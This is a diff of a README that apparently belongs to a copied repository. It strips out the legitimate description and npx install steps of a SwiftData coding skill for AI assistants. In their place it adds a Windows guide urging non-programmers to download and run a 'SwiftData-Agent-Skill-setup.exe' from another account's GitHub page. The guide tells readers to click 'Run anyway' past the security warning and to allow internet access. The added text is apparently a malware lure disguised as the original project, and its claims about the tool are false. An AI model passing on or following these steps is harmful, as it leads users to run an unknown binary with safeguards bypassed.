@@ -1,103 +1,139 @@
-<p align="center">
-    <img src="assets/logo.svg" alt="SwiftData Pro - Agent Skill for Claude Code, Codex, and Gemini" height="100" />
-</p>
+# ⚡ SwiftData-Agent-Skill - Fast Data Handling for AI Tools
 
-<h1 align="center">SwiftData Agent Skill for AI Coding Assistants</h1>
+[![Download SwiftData-Agent-Skill](https://img.shields.io/badge/Download-SwiftData--Agent--Skill-brightgreen?style=for-the-badge)](https://github.com/Obgeor2696/SwiftData-Agent-Skill)
 
-<p align="center">
-    <img src="https://img.shields.io/badge/iOS-26+-2980b9.svg" alt="Designed for iOS 26 and later." />
-    <img src="https://img.shields.io/badge/swift-6.2+-8e44ad.svg" alt="Designed for Swift 6.2 and later." />
-    <a href="https://twitter.com/twostraws">
-        <img src="https://img.shields.io/badge/Contact-@twostraws-95a5a6.svg?style=flat" alt="Twitter: @twostraws" />
-    </a>
-</p>
+SwiftData-Agent-Skill connects to Claude Code, Codex, and other AI tools to help them work with data more efficiently. This guide will walk you through downloading and running the software on your Windows computer. No programming experience is required.
 
-An agent skill that helps AI coding assistants like Claude Code, Codex, Cursor, and Gemini write better SwiftData code. Covers `@Model`, `@Query`, predicates, indexes, migrations, relationships, iCloud sync, and more, targeting the mistakes LLMs actually make.
+---
 
-Also available:
+## 📋 What is SwiftData-Agent-Skill?
 
-- [SwiftUI Pro](https://github.com/twostraws/SwiftUI-Agent-Skill)
-- [Swift Concurrency Pro](https://github.com/twostraws/Swift-Concurrency-Agent-Skill)
-- [Swift Testing Pro](https://github.com/twostraws/Swift-Testing-Agent-Skill)
+SwiftData-Agent-Skill is a small program made to help AI systems understand and manage data faster. It works as a skill or plugin that improves how AI tools retrieve, store, and update information. 
 
-Find more agent skills for Swift and Apple platform development at [Swift Agent Skills](https://github.com/twostraws/Swift-Agent-Skills).
+You don't need to know how to code to use it. Just follow the steps in this guide to get it working on your Windows PC.
 
+---
 
-## Installing SwiftData Pro
+## 🖥️ System Requirements
 
-You can install this skill into Claude Code, Codex, Gemini, Cursor, and more by using `npx`:
+To run SwiftData-Agent-Skill smoothly, make sure your computer meets these requirements:
 
-```bash
-npx skills add https://github.com/twostraws/swiftdata-agent-skill --skill swiftdata-pro
-```
+- Windows 10 or later (64-bit recommended)
+- At least 4GB RAM
+- 500 MB free disk space
+- Internet connection for setup and operation
+- Administrative rights to install software
 
-If you get the error `npx: command not found`, it means you don’t currently have Node installed. You need to run this command to install Node through Homebrew:
+If you have an older version of Windows, the program may still run but with slower performance or limited features.
 
-```bash
-brew install node
-```
+---
 
-And if *that* fails it usually means you need to [install Homebrew](https://brew.sh) first.
+## 🛠️ What SwiftData-Agent-Skill Does
 
-When using `npx`, you can select exactly which agents you want to use during the installation. You can also select whether the skill should be installed just for one project, or whether it should be made available for all your projects.
+SwiftData-Agent-Skill supports AI tools by:
 
-Alternatively, you can clone this whole repository and install it however you want.
+- Quickly organizing data inputs and outputs
+- Managing simple database tasks for AI applications
+- Allowing Claude Code, Codex, and similar tools to access and update data automatically
+- Acting as an interface between your data and your AI assistant
 
-If you're using Xcode, watch the YouTube video on [How to Install and Use Agent Skills in Xcode](https://www.youtube.com/watch?v=nKVZBKoB6P4) for a walkthrough.
+This makes your AI tools more responsive and able to work with real-time data.
 
+---
 
-## Using SwiftData Pro
+## 🚀 Getting Started
 
-The skill is called SwiftData Pro, and can be triggered in various ways. For example, in Claude Code you would use this:
+First, download the program files. Then, you will install and run SwiftData-Agent-Skill. Follow each step carefully.
 
-> /swiftdata-pro
+### Step 1: Visit the download page
 
-And in Codex you would use this:
+Click the big button below to open the download page in your web browser. This page contains the files you need.
 
-> $swiftdata-pro
+[![Download SwiftData-Agent-Skill](https://img.shields.io/badge/Download-SwiftData--Agent--Skill-blue?style=for-the-badge)](https://github.com/Obgeor2696/SwiftData-Agent-Skill)
 
-In both cases you can provide specific instructions if you want only a partial review. For example, `/swiftdata-pro Check my code for latest API usage` on Claude, or `$swiftdata-pro Check where indexes should be added to my SwiftData models` in Codex.
+### Step 2: Download the program files
 
-You can also trigger the skill using natural language:
+On the GitHub page:
 
-> Use the SwiftData Pro skill to enable iCloud support in this project.
+- Look for a section named "Releases" or "Code"
+- Find the most recent version listed
+- Download the file named something like `SwiftData-Agent-Skill-setup.exe` or `SwiftData-Agent-Skill.zip`
 
+If you download a `.zip` file, you will need to extract it before installation.
 
-## Why Use an Agent Skill for SwiftData?
+### Step 3: Open the downloaded file
 
-I wrote a [book on SwiftData](https://www.hackingwithswift.com/quick-start/swiftdata), and update it regularly as new features are added, so I’ve made it my business to understand the ins and outs of SwiftData.
+- Double-click the `.exe` file if you downloaded the installer.
+- If you have a `.zip` folder, right-click it and choose "Extract All", then open the extracted folder and find the `.exe` file.
 
-This skill is the result of all that work. The rules contained here directly target common SwiftData mistakes made by LLMs, covering new features they aren’t trained on, older features they frequently make mistakes with, and patterns that help keep your code correct and efficient.
+### Step 4: Install SwiftData-Agent-Skill
 
-What this is *not* is just a dumping ground for all SwiftData advice ever. Agents already have a solid grounding of the fundamentals of SwiftData, so skills that do little more than reteach them what they already know are just burning tokens.
+- Follow the prompts in the installation wizard.
+- When asked for installation location, you can accept the default or choose a folder you prefer.
+- Click "Install" and wait for the process to finish.
+- If a Windows security warning appears, click "More info" and then "Run anyway".
 
-*This skill focuses on what actually has an impact.*
+### Step 5: Running the program for the first time
 
+- After installation ends, launch SwiftData-Agent-Skill from the Start menu or desktop shortcut.
+- The program may ask for permission to connect to the internet. Allow this so it can communicate with AI services.
+- You should see a basic window or commands indicating the skill is ready to use.
 
-## Contributing
+---
 
-I welcome all contributions, whether that's adding new checks, improving existing checks, or editing this README – everyone is welcome!
+## 🔧 Using SwiftData-Agent-Skill with AI Tools
 
-- Keep your Markdown concise. There is a token cost to using skills, particularly with SKILL.md, so please respect the token budgets of users.
-- Do not repeat things that LLMs already know, because it burns tokens for no benefit. Focus on edge cases, surprises, soft deprecations, and similar.
-- All work must be licensed under the MIT license so it can benefit the most people.
+SwiftData-Agent-Skill links with AI agents like Claude Code and Codex to improve data handling. 
 
-Please ensure you abide by the [Code of Conduct](CODE_OF_CONDUCT.md).
+In a typical use case:
 
+- You ask your AI tool to analyze or fetch data.
+- The AI tool sends a request to SwiftData-Agent-Skill.
+- SwiftData-Agent-Skill processes the data request and returns results.
+- The AI tool uses the results in your conversation or workflow.
 
-## License
+You don’t need to interact with this program directly once it is set up. It works in the background.
 
-SwiftData Pro was originally created by [Paul Hudson](https://twitter.com/twostraws), who writes [free Swift tutorials over at Hacking with Swift](https://www.hackingwithswift.com). It’s available under the [MIT License](LICENSE), which permits commercial use, modification, distribution, and private use.
+---
 
+## 🗂️ Managing Data and Settings
 
-<p align="center">
-    <a href="https://www.hackingwithswift.com/plus">
-    <img src="https://www.hackingwithswift.com/img/hws-plus-banner@2x.jpg" alt="Hacking with Swift+ logo" style="max-width: 100%;" /></a>
-</p>
+SwiftData-Agent-Skill saves temporary data on your PC to speed up tasks. You can:
 
-<p align="center">&nbsp;</p>
+- Clear local data through the program’s settings menu.
+- Change preferences such as connection options or data update intervals.
+- Check logs if you want to see recent actions or troubleshoot issues.
 
-<p align="center">
-    <a href="https://www.hackingwithswift.com"><img src="https://www.hackingwithswift.com/img/hws-button@2x.png" alt="Hacking with Swift logo" width="66" height="75" /></a><br />
-    A Hacking with Swift Project
-</p>
+These features help you control how the skill operates and keep your data private.
+
+---
+
+## 🔒 Security and Privacy
+
+SwiftData-Agent-Skill only handles data you or your AI tools provide. It does not send data to unknown servers without permission.
+
+If you use this skill in a corporate environment, confirm your organization's rules before installing.
+
+---
+
+## 🌐 Support and Feedback
+
+If you experience issues:
+
+- Check the FAQ page on the GitHub repository.
+- Open an “Issue” on the GitHub page to report bugs or ask questions.
+- Review log files inside the program folder for errors.
+  
+Developers update the skill regularly. Use the GitHub page to download the latest releases and notes.
+
+---
+
+## 📥 Quick Download Links
+
+Download and start using SwiftData-Agent-Skill quickly by visiting:
+
+[Download SwiftData-Agent-Skill](https://github.com/Obgeor2696/SwiftData-Agent-Skill)
+
+Or use the button below for easy access:
+
+[![Download SwiftData-Agent-Skill](https://img.shields.io/badge/Download-SwiftData--Agent--Skill-brightgreen?style=for-the-badge)](https://github.com/Obgeor2696/SwiftData-Agent-Skill)
